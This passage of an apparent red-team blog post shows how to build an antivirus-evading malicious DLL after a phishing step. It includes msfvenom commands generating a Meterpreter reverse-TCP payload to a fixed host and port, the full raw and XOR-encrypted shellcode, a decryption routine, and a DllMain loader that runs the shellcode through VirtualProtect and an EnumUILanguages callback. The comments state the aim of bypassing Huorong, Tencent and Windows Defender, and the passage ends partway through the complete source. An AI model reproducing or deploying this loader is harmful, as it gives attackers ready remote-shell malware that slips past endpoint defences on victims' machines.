+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Above all that, the phishing part is over, the next part is how to bypass Huorong, Tencent Anti-Virus and Windows Defender.</p>
+<h2 id="Bypass-Part"><a href="#Bypass-Part" class="headerlink" title="Bypass Part"></a>Bypass Part</h2><h3 id="How-to-create-malicious-DLL-file"><a href="#How-to-create-malicious-DLL-file" class="headerlink" title="How to create malicious DLL file?"></a>How to create malicious DLL file?</h3><p>To be honest, the first idea in my mind is creating the DLL by msfvenom.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom <span class="token parameter variable">-p</span> windows/x64/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.107.128 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4450</span> <span class="token parameter variable">-f</span> dll <span class="token parameter variable">-0</span> malicious_dll.dll<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>But it will detected by Huorong, Tencent Anti-virus and Windows Defender.</p>
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FkZYHnDxbqd_MKft1GX0f5LHUIdB.png"></p>
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FiqaVX2o2vuXJuQYmzoe47HiJVec.png"></p>
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fr9i0zYucV6nsQztl1QBkvQ0CTHL.png"></p>
+<p>So we have to write DLL file by ourselves to bypass the detection. If our DLL file land safely, we have already bypass the Anti-Virus static detection.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom <span class="token parameter variable">-p</span> windows/x64/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.107.128 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4450</span> <span class="token parameter variable">-f</span> c <span class="token parameter variable">-v</span> shellcode<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>Use msfvenom create shellcode<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fv38g8E3dubV8mCO7i64Zccn8zXp.png"></p>
+<h3 id="ShellCode-Encryption"><a href="#ShellCode-Encryption" class="headerlink" title="ShellCode Encryption"></a>ShellCode Encryption</h3><p>We can use the simple XOR encrytion to decorate shellcode.</p>
+<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">unsigned</span> <span class="token keyword">char</span> encryptedShellcode<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span>
+<span class="token string">"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"</span>
+<span class="token string">"\x52\x51\x48\x31\xd2\x65\x48\x8b\x52\x60\x56\x48\x8b\x52"</span>
+<span class="token string">"\x18\x48\x8b\x52\x20\x4d\x31\xc9\x48\x8b\x72\x50\x48\x0f"</span>
+<span class="token string">"\xb7\x4a\x4a\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"</span>
+<span class="token string">"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"</span>
+<span class="token string">"\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"</span>
+<span class="token string">"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"</span>
+<span class="token string">"\x74\x67\x48\x01\xd0\x44\x8b\x40\x20\x49\x01\xd0\x50\x8b"</span>
+<span class="token string">"\x48\x18\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x4d\x31\xc9"</span>
+<span class="token string">"\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1"</span>
+<span class="token string">"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"</span>
+<span class="token string">"\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"</span>
+<span class="token string">"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58\x48\x01"</span>
+<span class="token string">"\xd0\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"</span>
+<span class="token string">"\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"</span>
+<span class="token string">"\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00"</span>
+<span class="token string">"\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49"</span>
+<span class="token string">"\x89\xe5\x49\xbc\x02\x00\x11\x62\xc0\xa8\x6b\x80\x41\x54"</span>
+<span class="token string">"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5"</span>
+<span class="token string">"\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b"</span>
+<span class="token string">"\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31"</span>
+<span class="token string">"\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41"</span>
+<span class="token string">"\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58"</span>
+<span class="token string">"\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5"</span>
+<span class="token string">"\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00"</span>
+<span class="token string">"\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58"</span>
+<span class="token string">"\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00"</span>
+<span class="token string">"\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68"</span>
+<span class="token string">"\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba"</span>
+<span class="token string">"\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"</span>
+<span class="token string">"\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9"</span>
+<span class="token string">"\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68"</span>
+<span class="token string">"\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f"</span>
+<span class="token string">"\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49"</span>
+<span class="token string">"\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48"</span>
+<span class="token string">"\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2"</span>
+<span class="token string">"\xf0\xb5\xa2\x56\xff\xd5"</span><span class="token punctuation">;</span>
+
+
+
+<span class="token keyword">char</span> key<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"lkdajsdwqe,sadlqwe:_)"</span><span class="token punctuation">;</span>
+<span class="token keyword">char</span> cipherType<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"xor"</span><span class="token punctuation">;</span>
+<span class="token comment">// Char array to host the deciphered shellcode</span>
+<span class="token keyword">unsigned</span> <span class="token keyword">char</span> shellcode<span class="token punctuation">[</span><span class="token keyword">sizeof</span> encryptedShellcode<span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">unsigned</span> <span class="token keyword">char</span> shellcode2<span class="token punctuation">[</span><span class="token keyword">sizeof</span> encryptedShellcode<span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> encryptedShellcode <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>
+
+
+<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">// XOR decoding stub using the key defined above must be the same as the encoding key</span>
+<span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token keyword">sizeof</span> encryptedShellcode<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    	<span class="token keyword">if</span> <span class="token punctuation">(</span>j <span class="token operator">==</span> <span class="token keyword">sizeof</span> key <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+        <span class="token comment">// shellcode[sizeof encryptedShellcode - 1 - i] = encryptedShellcode[i];</span>
+        shellcode<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>encryptedShellcode<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0x72</span><span class="token punctuation">)</span> <span class="token operator">^</span> key<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token punctuation">;</span>
+        <span class="token comment">// shellcode[i] = (shellcode[i] ^ key[j]) - 0x72;</span>
+        <span class="token comment">// shellcode[i] = encryptedShellcode[i] ^ key[j];</span>
+        j<span class="token operator">++</span><span class="token punctuation">;</span>
+
+        <span class="token punctuation">&#125;</span>
+
+        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token keyword">sizeof</span> encryptedShellcode<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\\x%x"</span><span class="token punctuation">,</span> shellcode<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>We can get the encrypted shellcode.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FjtCDydblBjFy2iyRBkoN9BeOjVv.png"></p>
+<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">unsigned</span> <span class="token keyword">char</span> E_shellcode<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span>
+<span class="token string">"\x2\xd1\x91\x37\x8\x29\x5a\x5\x3\x17\x9f\xb0\xd2\xa6\xa8\xb2\xcd\xc6\x7e\x88\x93\x91\xaf\xb6\xa9\xd0\x8e\xa0\xfd\xcb\x98\xe8\xe1\xde\xc7\x57\xcb\x8a\x81\xf8\xe5\xa8\x45\xd7\xd8\xdb\xc9\x41\x7a\xd9\xa2\x8b\x58\xed\xf3\xd7\x5f\x4a\x8\xd6\x49\x6c\x7d\x33\xaf\xd7\xa2\xd0\x8e\xa0\xe5\x8c\xd1\x82\xc9\x12\x26\xb4\x82\x9d\xef\x47\x2b\xa8\x9b\x8f\x16\x13\x18\x8e\x96\x8d\x3\x17\x5e\xc9\x96\x56\x8a\xa8\xcd\x16\x78\xe9\xd4\xde\xf9\xdf\x12\x28\xb1\x99\xcd\xfb\x30\xe4\xc9\x10\x5f\xdf\x8c\xd1\x9f\x85\xfc\x12\xd6\x18\x2c\xdb\xc9\x41\x7a\xc4\x42\x5e\x53\xc0\x12\x57\xc6\x23\x90\x6\x84\x2a\x97\xfa\x11\xd3\xca\x29\x94\x2e\xbd\xc7\x98\x9e\xe5\xda\x17\x2e\xa9\xc4\x98\x44\xe5\x9f\x91\xd9\xea\xda\x19\x31\xd7\x8a\x7\x9f\x9f\xb9\xdb\x17\x2e\xc2\xbd\xb5\xf1\x93\x9a\xa6\xd8\xaf\xd2\xa6\xc9\x91\x29\xe3\xd6\xe8\x2\x33\xae\xdf\xba\xbb\xdf\xc7\xdb\x72\xd1\x1a\x15\x10\xa5\xc8\x54\x9e\x94\xc1\xfd\xd6\xc5\x16\x1e\xc2\xbf\xde\xc1\x7\x93\x9f\x35\x76\x12\x18\x1\xdf\x8c\x26\xde\x2\x7\x13\xe7\xb8\x43\x6d\xb8\xc8\xec\xef\xd7\x90\x32\xdf\x91\x10\xd7\x5b\xcf\x8c\xb4\xa\x10\x23\xd2\x8a\x2b\xbf\x49\x2c\x5b\x1e\xa0\xd7\x4d\xf1\x81\xb9\x5\x0\x22\xf0\xf\xd2\xb4\xae\xb3\xc8\xc6\x1\xe0\x8a\x5e\xd1\x15\x53\xd0\x88\x50\xcd\x0\x57\x96\x88\x52\xd7\x40\x2d\xf6\x34\x68\x2e\x6e\xd6\x90\x5d\xbd\xe8\xc0\xae\xc9\x8a\x31\x96\x88\xa\xd7\x40\x7a\x60\x83\xe9\x2e\x6e\x9b\x59\x82\x1d\xd1\x2\x24\x90\x26\x3f\x29\x1\x13\x16\xd6\x84\x29\xe7\x80\xa4\x7d\xd3\xc8\x5f\xbd\x1c\xc0\xae\xcd\x8a\xe\x9f\x5f\x15\x2f\x56\xa0\x6\x22\xcf\x35\x5b\x9c\xac\xde\x94\x5c\xe1\xb4\x8c\x19\xb9\x9e\xc0\xaa\xbe\x1e\xf3\x5\x17\x89\x95\x93\x97\xf\xde\xc2\x51\xc0\x48\xbd\x67\xa0\x7b\x2\x26\xde\x97\x44\xcc\x9e\x3\xe0\x8a\x57\xd0\x9f\x3\xd0\x88\x28\xcd\x8a\xe\x9f\x5f\x15\x2f\x56\xa0\x6\x22\xcf\x35\x5b\x83\xf1\xae\xd2\xa3\xb8\xbe\x5\xc3\x17\x5e\xc0\xab\xb8\x1e\xbd\xc4\x49\x47\xfe\xa8\xce\x1a\x23\xa8\xa1\xc0\x48\x90\x91\xda\xff\x2\x26\xdf\x1d\x31\x2c\xcb\x4b\x2e\x58\xd6\x18\x51\xdb\xf1\x4b\xde\x80\x19\x82\xa\xc0\x10\x3d\xa6\xad\x5\xae\x81\x66\x1d\xe\x4c\x70\xa9\x1b\x34\x16"</span><span class="token punctuation">;</span>
+
+<span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+
+	<span class="token keyword">unsigned</span> <span class="token keyword">char</span> shellcode<span class="token punctuation">[</span><span class="token keyword">sizeof</span> E_shellcode<span class="token punctuation">]</span><span class="token punctuation">;</span>
+	<span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+
+	<span class="token keyword">char</span> key<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"lkdajsdwqe,sadlqwe:_)"</span><span class="token punctuation">;</span>
+	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token keyword">sizeof</span> E_shellcode<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+		<span class="token keyword">if</span> <span class="token punctuation">(</span>j <span class="token operator">==</span> <span class="token keyword">sizeof</span> key <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+		shellcode<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>E_shellcode<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> key<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x72</span><span class="token punctuation">;</span>
+		j<span class="token operator">++</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+
+	<span class="token keyword">return</span> shellcode<span class="token punctuation">;</span>
+
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>jmp_shellcode</p>
+<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">DWORD WINAPI <span class="token function">jmp_shellcode</span><span class="token punctuation">(</span>LPVOID pPara<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+
+	<span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span> addrShellcode <span class="token operator">=</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	DWORD dwOldPro <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+	BOOL ifExec <span class="token operator">=</span> <span class="token function">VirtualProtect</span><span class="token punctuation">(</span>addrShellcode<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>E_shellcode<span class="token punctuation">)</span><span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwOldPro<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment">// Callback function can bypass a lot of Anti-Virus softwares</span>
+	<span class="token function">EnumUILanguages</span><span class="token punctuation">(</span><span class="token punctuation">(</span>UILANGUAGE_ENUMPROC<span class="token punctuation">)</span>addrShellcode<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>DLL MAIN function</p>
+<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">HANDLE hThread <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
+BOOL WINAPI <span class="token function">DllMain</span><span class="token punctuation">(</span>HMODULE hModule<span class="token punctuation">,</span> DWORD dwReason<span class="token punctuation">,</span> PVOID pvReserved<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+	<span class="token keyword">if</span> <span class="token punctuation">(</span>dwReason <span class="token operator">==</span> DLL_PROCESS_ATTACH<span class="token punctuation">)</span>
+	<span class="token punctuation">&#123;</span>
+		<span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token function">DisableThreadLibraryCalls</span><span class="token punctuation">(</span>hModule<span class="token punctuation">)</span><span class="token punctuation">;</span>
+		hThread <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> jmp_shellcode<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token function">MessageBox</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> L<span class="token string">"You are hacked "</span><span class="token punctuation">,</span> L<span class="token string">"Hacked by Leviathan"</span><span class="token punctuation">,</span> MB_OK<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+	<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>dwReason <span class="token operator">==</span> DLL_PROCESS_DETACH<span class="token punctuation">)</span>
+	<span class="token punctuation">&#123;</span>
+	<span class="token punctuation">&#125;</span>
+
+	<span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>The whole DLL_File source code</p>
+<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// dllmain.cpp : Defines the entry point for the DLL application.</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"pch.h"</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;windows.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+
+
+
+<span class="token keyword">typedef</span> <span class="token keyword">void</span><span class="token punctuation">(</span>__stdcall<span class="token operator">*</span> JMP_SHELLCODE<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">//unsigned char shellcode[] =</span>
+<span class="token comment">//"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"</span>
+<span class="token comment">//"\x52\x51\x48\x31\xd2\x56\x65\x48\x8b\x52\x60\x48\x8b\x52"</span>
+<span class="token comment">//"\x18\x48\x8b\x52\x20\x4d\x31\xc9\x48\x0f\xb7\x4a\x4a\x48"</span>
+<span class="token comment">//"\x8b\x72\x50\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"</span>
+<span class="token comment">//"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x41"</span>
+<span class="token comment">//"\x51\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"</span>
+<span class="token comment">//"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"</span>
+<span class="token comment">//"\x74\x67\x48\x01\xd0\x8b\x48\x18\x50\x44\x8b\x40\x20\x49"</span>
+<span class="token comment">//"\x01\xd0\xe3\x56\x48\xff\xc9\x4d\x31\xc9\x41\x8b\x34\x88"</span>
+<span class="token comment">//"\x48\x01\xd6\x48\x31\xc0\x41\xc1\xc9\x0d\xac\x41\x01\xc1"</span>
+<span class="token comment">//"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"</span>
+<span class="token comment">//"\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"</span>
+<span class="token comment">//"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41"</span>
+<span class="token comment">//"\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"</span>
+<span class="token comment">//"\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"</span>
+<span class="token comment">//"\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00"</span>
+<span class="token comment">//"\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49"</span>
+<span class="token comment">//"\x89\xe5\x49\xbc\x02\x00\x11\x62\xc0\xa8\x6b\x80\x41\x54"</span>
+<span class="token comment">//"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5"</span>
+<span class="token comment">//"\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b"</span>
+<span class="token comment">//"\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31"</span>
+<span class="token comment">//"\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41"</span>
+<span class="token comment">//"\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58"</span>
+<span class="token comment">//"\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5"</span>
+<span class="token comment">//"\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00"</span>
+<span class="token comment">//"\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58"</span>
+<span class="token comment">//"\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00"</span>
+<span class="token comment">//"\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68"</span>
+<span class="token comment">//"\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba"</span>
+<span class="token comment">//"\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"</span>
+<span class="token comment">//"\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9"</span>
+<span class="token comment">//"\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68"</span>
+<span class="token comment">//"\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f"</span>
+<span class="token comment">//"\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49"</span>
+<span class="token comment">//"\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48"</span>
+<span class="token comment">//"\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2"</span>
+<span class="token comment">//"\xf0\xb5\xa2\x56\xff\xd5";</span>
+
+<span class="token keyword">unsigned</span> <span class="token keyword">char</span> E_shellcode<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span>
+<span class="token string">"\x2\xd1\x91\x37\x8\x29\x5a\x5\x3\x17\x9f\xb0\xd2\xa6\xa8\xb2\xcd\xc6\x7e\x88\x93\x91\xaf\xb6\xa9\xd0\x8e\xa0\xfd\xcb\x98\xe8\xe1\xde\xc7\x57\xcb\x8a\x81\xf8\xe5\xa8\x45\xd7\xd8\xdb\xc9\x41\x7a\xd9\xa2\x8b\x58\xed\xf3\xd7\x5f\x4a\x8\xd6\x49\x6c\x7d\x33\xaf\xd7\xa2\xd0\x8e\xa0\xe5\x8c\xd1\x82\xc9\x12\x26\xb4\x82\x9d\xef\x47\x2b\xa8\x9b\x8f\x16\x13\x18\x8e\x96\x8d\x3\x17\x5e\xc9\x96\x56\x8a\xa8\xcd\x16\x78\xe9\xd4\xde\xf9\xdf\x12\x28\xb1\x99\xcd\xfb\x30\xe4\xc9\x10\x5f\xdf\x8c\xd1\x9f\x85\xfc\x12\xd6\x18\x2c\xdb\xc9\x41\x7a\xc4\x42\x5e\x53\xc0\x12\x57\xc6\x23\x90\x6\x84\x2a\x97\xfa\x11\xd3\xca\x29\x94\x2e\xbd\xc7\x98\x9e\xe5\xda\x17\x2e\xa9\xc4\x98\x44\xe5\x9f\x91\xd9\xea\xda\x19\x31\xd7\x8a\x7\x9f\x9f\xb9\xdb\x17\x2e\xc2\xbd\xb5\xf1\x93\x9a\xa6\xd8\xaf\xd2\xa6\xc9\x91\x29\xe3\xd6\xe8\x2\x33\xae\xdf\xba\xbb\xdf\xc7\xdb\x72\xd1\x1a\x15\x10\xa5\xc8\x54\x9e\x94\xc1\xfd\xd6\xc5\x16\x1e\xc2\xbf\xde\xc1\x7\x93\x9f\x35\x76\x12\x18\x1\xdf\x8c\x26\xde\x2\x7\x13\xe7\xb8\x43\x6d\xb8\xc8\xec\xef\xd7\x90\x32\xdf\x91\x10\xd7\x5b\xcf\x8c\xb4\xa\x10\x23\xd2\x8a\x2b\xbf\x49\x2c\x5b\x1e\xa0\xd7\x4d\xf1\x81\xb9\x5\x0\x22\xf0\xf\xd2\xb4\xae\xb3\xc8\xc6\x1\xe0\x8a\x5e\xd1\x15\x53\xd0\x88\x50\xcd\x0\x57\x96\x88\x52\xd7\x40\x2d\xf6\x34\x68\x2e\x6e\xd6\x90\x5d\xbd\xe8\xc0\xae\xc9\x8a\x31\x96\x88\xa\xd7\x40\x7a\x60\x83\xe9\x2e\x6e\x9b\x59\x82\x1d\xd1\x2\x24\x90\x26\x3f\x29\x1\x13\x16\xd6\x84\x29\xe7\x80\xa4\x7d\xd3\xc8\x5f\xbd\x1c\xc0\xae\xcd\x8a\xe\x9f\x5f\x15\x2f\x56\xa0\x6\x22\xcf\x35\x5b\x9c\xa